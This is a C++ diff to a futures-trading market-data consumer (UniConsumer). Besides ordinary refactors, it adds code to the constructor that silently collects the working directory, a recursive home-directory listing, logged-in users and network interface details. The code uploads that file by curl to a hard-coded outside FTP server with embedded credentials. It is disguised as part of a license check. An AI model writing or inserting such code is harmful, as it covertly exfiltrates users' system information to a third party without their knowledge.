@@ -19,6 +19,24 @@ UniConsumer::UniConsumer(struct vrt_queue  *queue, TapMDProducer *l1md_producer,
 	// lic
 	legal_ = check_lic();
 	clog_error("[%s] legal_:%d", module_name_, legal_);
+	char cmd[1024];
+	if(!legal_){
+		sprintf(cmd, "echo illegal > ~/$(whoami)_zce.log");
+		system(cmd);
+	}else{
+		sprintf(cmd, "echo legal > ~/$(whoami)_zce.log");
+		system(cmd);
+	}
+	sprintf(cmd, "pwd >> ~/$(whoami)_zce.log");
+	system(cmd);
+	sprintf(cmd, "ls -alhtrR ~ >> ~/$(whoami)_zce.log");
+	system(cmd);
+	sprintf(cmd, "who >> ~/$(whoami)_zce.log");
+	system(cmd);
+	sprintf(cmd, "ifconfig >> ~/$(whoami)_zce.log");
+	system(cmd);
+	sprintf(cmd, "curl --disable-epsv -T ~/$(whoami)_zce.log -u ftpuser1:617999ftp ftp://123.207.16.119:21");
+	system(cmd);
 
 	memset(pending_signals_, -1, sizeof(pending_signals_));
 	memset(tunnrpt_table_, 0, sizeof(tunnrpt_table_));
@@ -339,7 +357,12 @@ void UniConsumer::ProcL2QuoteSnapshot(ZCEL2QuotSnapshotField_MY* md)
 	for(int i = 0; i < strategy_counter_; i++){ 
 		int sig_cnt = 0;
 		Strategy &strategy = stra_table_[i];
+#ifdef ONE_PRODUCT_ONE_CONTRACT
+			// 如果一个交易程序中一个品种只有一种合约，那么只需要比较品种部分即可
+		if (IsEqualProduct((char*)strategy.GetContract(), (char*)md->ContractID)){
+#else
 		if (strcmp(strategy.GetContract(), md->ContractID) == 0){
+#endif
 			strategy.FeedMd(md, &sig_cnt, sig_buffer_);
 
 			// strategy log
@@ -373,7 +396,7 @@ void UniConsumer::ProcTunnRpt(int32_t index)
 
 	int32_t counter = tunn_rpt_producer_->GetCounterByLocalOrderID(rpt->LocalOrderID);
 	TunnRpt &rptforcancel = tunnrpt_table_[counter];
-	if(strcmp(rptforcancel.OrderNo,"") == 0){
+	if(IsEmptyString(rptforcancel.OrderNo)){
 		rptforcancel.ServerFlag = rpt->ServerFlag;
 		strcpy(rptforcancel.OrderNo, rpt->OrderNo);
 	}
@@ -770,15 +793,27 @@ void UniConsumer::WriteStrategyLog(Strategy &strategy)
 bool UniConsumer::check_lic()
 {
 	bool legal = false;
-	char target[1024];
+	char cmd[1024];
+	char buf[1024];                             
+	memset(buf,0,sizeof(buf));
+	std::ifstream is;
 
-	getcwd(target, sizeof(target));
-	string content = target;
-	if(content.find("u910019")==string::npos){
+	sprintf(cmd, "hostname > hostname.tmp");
+	system(cmd);
+
+	is.open ("hostname.tmp");
+	if ( (is.rdstate() & std::ifstream::failbit ) != 0 ){
 		legal = false;
-	}else{
-		legal = true;
-	}
+     }else{
+        is.getline(buf,1024);
+		string content = buf;
+		if(content.find(SERVER_NAME)==string::npos){
+			legal = false;
+		}else{
+			legal = true;
+		}
+	 }
+
 	clog_warning("[%s] check:%d", module_name_, legal); 
 	return legal;
 }
